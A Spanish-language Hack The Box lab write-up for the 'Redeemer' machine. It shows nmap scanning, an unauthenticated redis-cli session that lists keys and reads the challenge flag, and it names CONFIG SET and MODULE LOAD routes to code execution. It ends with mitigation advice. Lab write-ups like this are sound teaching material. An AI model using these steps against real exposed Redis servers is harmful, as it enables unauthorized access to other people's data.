---
title: Redeemer
os: Linux
dificultad: Very Easy
ip: 10.129.136.187
fecha: 2026-10-17
categoria: Starting Point
estado: completada
tags: [htb, linux, redis, unauthenticated-access]
---

# Redeemer — Informe de Pentest

> Writeup de la máquina **Redeemer** de [Hack The Box](https://www.hackthebox.com/). Documento con fines educativos, realizado en un entorno de laboratorio autorizado.

## Información general

| Campo                   | Detalle         |
| ----------------------- | --------------- |
| **Máquina**             | Redeemer        |
| **Sistema operativo**   | Linux           |
| **Dificultad**          | Very Easy       |
| **Categoría**           | Starting Point  |
| **Dirección IP**        | `10.129.136.187`|
| **Fecha de resolución** | 2026-10-17      |
| **Autor del informe**   | NiettoFrann     |
| **Estado**              | Completada      |

## Índice

1. [Resumen ejecutivo](#resumen-ejecutivo)
2. [Alcance y metodología](#alcance-y-metodología)
3. [Cadena de ataque](#cadena-de-ataque)
4. [Reconocimiento](#reconocimiento)
5. [Enumeración](#enumeración)
6. [Explotación (Foothold)](#explotación-foothold)
7. [Escalada de privilegios](#escalada-de-privilegios)
8. [Flags](#flags)
9. [Vulnerabilidades identificadas](#vulnerabilidades-identificadas)
10. [Recomendaciones de mitigación](#recomendaciones-de-mitigación)
11. [Lecciones aprendidas](#lecciones-aprendidas)
12. [Herramientas utilizadas](#herramientas-utilizadas)
13. [Evidencia](#evidencia)
14. [Referencias](#referencias)

---

## Resumen ejecutivo

La máquina `Redeemer` se comprometió a través de una instancia de **Redis sin autenticación**.

- El único puerto abierto es el **6379/tcp (Redis)**, con `Redis 5.0.7`.
- El servidor no exige contraseña (`requirepass` no configurado), por lo que `redis-cli` se conecta directamente con privilegios completos sobre la base de datos.
- No fue necesario explotar ninguna vulnerabilidad de software: bastó con conectarse y listar las claves (`KEYS *`) para localizar y leer la flag almacenada como valor.

**Impacto:** cualquier persona con conectividad de red al puerto 6379 puede leer, modificar o borrar todos los datos almacenados en Redis sin autenticarse, y en configuraciones más permisivas (módulos, `CONFIG SET dir/dbfilename`) esto puede escalar a ejecución remota de código.

## Alcance y metodología

- **Objetivo:** `10.129.136.187` (Redeemer)
- **Tipo de prueba:** caja negra, sin credenciales previas.
- **Metodología:** Reconocimiento → Enumeración → Explotación → Post-explotación / Escalada de privilegios → Documentación.
- **Entorno:** conexión a la VPN de HTB desde Linux.

## Cadena de ataque

```text
Ping (TTL 63 → Linux) -> Escaneo de 65535 puertos (solo 6379/tcp) -> Escaneo detallado (Redis 5.0.7)
  -> Conexión con redis-cli sin autenticación -> KEYS * -> GET flag
```

---

## Reconocimiento

### Conectividad y sistema operativo

Se comprobó que el host responde y se infirió el sistema operativo a partir del TTL.

```bash
ping -c 1 10.129.136.187 | tee loot/ping.txt
```

```text
PING 10.129.136.187 (10.129.136.187) 56(84) bytes of data.
64 bytes from 10.129.136.187: icmp_seq=1 ttl=63 time=240 ms

--- 10.129.136.187 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 239.759/239.759/239.759/0.000 ms
```

> Evidencia: [`loot/ping.txt`](loot/ping.txt)

| Dato     | Valor   | Interpretación                                                                                             |
| -------- | ------- | ------------------------------------------------------------------------------------------------------------ |
| Latencia | ~240 ms | Host activo, alcanzable por la VPN.                                                                          |
| TTL      | `63`    | Los sistemas Linux/Unix parten de TTL 64; el valor 63 indica un salto intermedio (VPN). Sistema **Linux**.    |

### Escaneo de puertos

Primero se escanearon **todos los puertos TCP** de forma rápida para descubrir la superficie de ataque:

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.136.187 -oN loot/puertos.txt
```

```text
Nmap scan report for 10.129.136.187
Host is up (0.24s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
6379/tcp open  redis
```

> Evidencia: [`loot/puertos.txt`](loot/puertos.txt)

| Opción            | Motivo                                                   |
| ----------------- | --------------------------------------------------------- |
| `-p-`              | Todos los puertos (1-65535).                              |
| `--min-rate=5000`  | Envía al menos 5000 paquetes/s para acelerar el escaneo.   |
| `-T4`              | Plantilla de tiempos agresiva.                             |
| `-Pn`              | Omite el descubrimiento de host (se asume activo).        |
| `-n`               | Sin resolución DNS.                                       |
| `-oN`              | Guarda la salida en formato normal.                        |

**Resultado:** 65534 puertos cerrados y un único puerto abierto.

| Puerto   | Estado | Servicio |
| -------- | ------ | -------- |
| 6379/tcp | open   | redis    |

Sobre el puerto descubierto se lanzó un escaneo de **detección de versiones y scripts por defecto**:

```bash
nmap -p6379 -sCV -Pn -n -T4 10.129.136.187 -oN loot/detallado.txt
```

```text
PORT     STATE SERVICE VERSION
6379/tcp open  redis   Redis key-value store 5.0.7
```

> Evidencia: [`loot/detallado.txt`](loot/detallado.txt)

| Opción  | Motivo                                               |
| ------- | ----------------------------------------------------- |
| `-p6379`| Limita el escaneo al puerto encontrado.                |
| `-sC`   | Ejecuta los scripts NSE por defecto.                   |
| `-sV`   | Detecta la versión del servicio.                       |

**Resultado:**

| Puerto   | Estado | Servicio | Versión                     |
| -------- | ------ | -------- | ---------------------------- |
| 6379/tcp | open   | redis    | `Redis key-value store 5.0.7`|

## Enumeración

### Redis (6379/tcp)

Se usó `redis-cli` para conectarse directamente al servicio y comprobar si exigía autenticación:

```bash
redis-cli -h 10.129.136.187 -p 6379
10.129.136.187:6379> info
```

La sección `# Server` confirma la versión y el sistema operativo subyacente:

```text
redis_version:5.0.7
os:Linux 5.4.0-77-generic x86_64
run_id:4a52cf9822e061dfbbe2e2f0e656fd255b393447
```

La conexión se estableció y el comando `INFO` se ejecutó **sin solicitar ninguna credencial**, lo que confirma que el servidor no tiene configurada la directiva `requirepass` en `redis.conf`.

También se observó en `# Keyspace` que la base de datos 0 contiene claves:

```text
db0:keys=4,expires=0,avg_ttl=0
```

> Evidencia: [`loot/redis.txt`](loot/redis.txt)

## Explotación (Foothold)

- **Vulnerabilidad:** instancia de Redis expuesta sin autenticación (configuración insegura, no un fallo de software).
- **Referencia:** [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html) / [Redis Security](https://redis.io/docs/management/security/).
- **Impacto:** lectura y escritura completa sobre todos los datos almacenados en la base, sin autenticar.

### Procedimiento

Con el acceso ya autenticado de forma implícita (sin contraseña), se listaron las claves existentes y se consultó cada una:

```bash
redis-cli -h 10.129.136.187 -p 6379
10.129.136.187:6379> select 0
OK
10.129.136.187:6379> keys *
1) "temp"
2) "stor"
3) "numb"
4) "flag"
10.129.136.187:6379> get flag
"03e1d2b376c37ab3f5319922053953eb"
```

`KEYS *` enumera todas las claves de la base de datos seleccionada y `GET flag` devuelve el valor de la clave `flag`, que contiene la flag del reto:

```text
03e1d2b376c37ab3f5319922053953eb
```

> Evidencia: [`loot/redis.txt`](loot/redis.txt) y [`loot/flag.txt`](loot/flag.txt)

## Escalada de privilegios

No fue necesaria. El objetivo de la máquina (obtener la flag) se cumple con el acceso no autenticado a Redis mediante `redis-cli`, sin llegar a obtener una shell en el sistema. Por ello no hay vector de escalada que documentar.

> Nota: en un escenario real, un Redis sin autenticación suele poder escalarse a ejecución remota de código abusando de `CONFIG SET dir` / `CONFIG SET dbfilename` para escribir una clave SSH autorizada (`authorized_keys`) o un webshell, o cargando el módulo `MODULE LOAD`. No se requirió en este ejercicio porque la flag ya era accesible directamente como valor de una clave.

---

## Flags

| Flag     | Valor                              |
| -------- | ----------------------------------- |
| `flag`   | `03e1d2b376c37ab3f5319922053953eb` |

> Redeemer pertenece a Starting Point: solo existe una flag, obtenida directamente desde Redis (no hay `user.txt` / `root.txt`). Evidencia: [`loot/flag.txt`](loot/flag.txt).

## Vulnerabilidades identificadas

| # | Vulnerabilidad                         | Severidad | CVSS | Componente      | Mitigación                                                            |
| - | --------------------------------------- | --------- | ---- | --------------- | ----------------------------------------------------------------------- |
| 1 | Redis expuesto sin autenticación        | Crítica   | N/A  | Redis (6379/tcp)| Configurar `requirepass` o ACLs y restringir el acceso por firewall.   |
| 2 | Redis accesible desde la red externa    | Alta      | N/A  | Redis (6379/tcp)| Vincular Redis a `127.0.0.1` o a una red interna, usar `bind`/firewall.|
| 3 | Tráfico Redis sin cifrar                | Media     | N/A  | Redis (6379/tcp)| Usar TLS (soportado desde Redis 6) o un túnel SSH/VPN.                  |

> Severidad: Crítica / Alta / Media / Baja / Informativa. Los valores CVSS no se calcularon para los hallazgos de configuración.

## Recomendaciones de mitigación

- [ ] Configurar `requirepass` (o ACLs de usuario en Redis 6+) con una contraseña robusta.
- [ ] Vincular Redis solo a interfaces internas (`bind 127.0.0.1`) y no exponerlo a redes públicas.
- [ ] Restringir el acceso al puerto 6379 mediante firewall a las IP necesarias.
- [ ] Deshabilitar comandos peligrosos (`CONFIG`, `FLUSHALL`, `MODULE LOAD`, etc.) con `rename-command` cuando no se necesiten.
- [ ] Mantener el software y los servicios actualizados.
- [ ] No almacenar información sensible en claro dentro de Redis si el servicio es accesible por terceros.

## Lecciones aprendidas

- Redis, por defecto, no exige autenticación; conviene probar siempre una conexión directa con `redis-cli` cuando se detecta el puerto 6379.
- `INFO` y `KEYS *` son suficientes para una enumeración rápida de un Redis mal configurado, sin necesidad de exploits.
- El TTL de un `ping` da una pista rápida del sistema operativo (64 ≈ Linux, 128 ≈ Windows).
- Escanear primero todos los puertos y luego profundizar solo en los abiertos ahorra tiempo.

## Herramientas utilizadas

| Herramienta  | Uso                                        |
| ------------ | ------------------------------------------- |
| ping         | Test de conectividad y estimación del SO    |
| nmap         | Escaneo de puertos, versiones y scripts     |
| redis-cli    | Conexión al servicio Redis y lectura de claves |

## Evidencia

Todos los artefactos están en la carpeta [`loot/`](loot/):

| Fichero                                  | Contenido                                                       |
| ----------------------------------------- | ----------------------------------------------------------------- |
| [`ping.txt`](loot/ping.txt)               | Test de conectividad (TTL 63).                                    |
| [`puertos.txt`](loot/puertos.txt)         | Escaneo completo de puertos (solo 6379/tcp abierto).              |
| [`detallado.txt`](loot/detallado.txt)     | Detección de versión (Redis 5.0.7).                                |
| [`redis.txt`](loot/redis.txt)             | Sesión de `redis-cli`: `INFO`, `KEYS *` y `GET flag`.              |
| [`flag.txt`](loot/flag.txt)               | Flag obtenida desde la clave `flag` de Redis.                      |

## Referencias

- [Página de la máquina en HTB](https://app.hackthebox.com/machines/Redeemer)
- [Redis Security — documentación oficial](https://redis.io/docs/management/security/)
- [HackTricks — Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
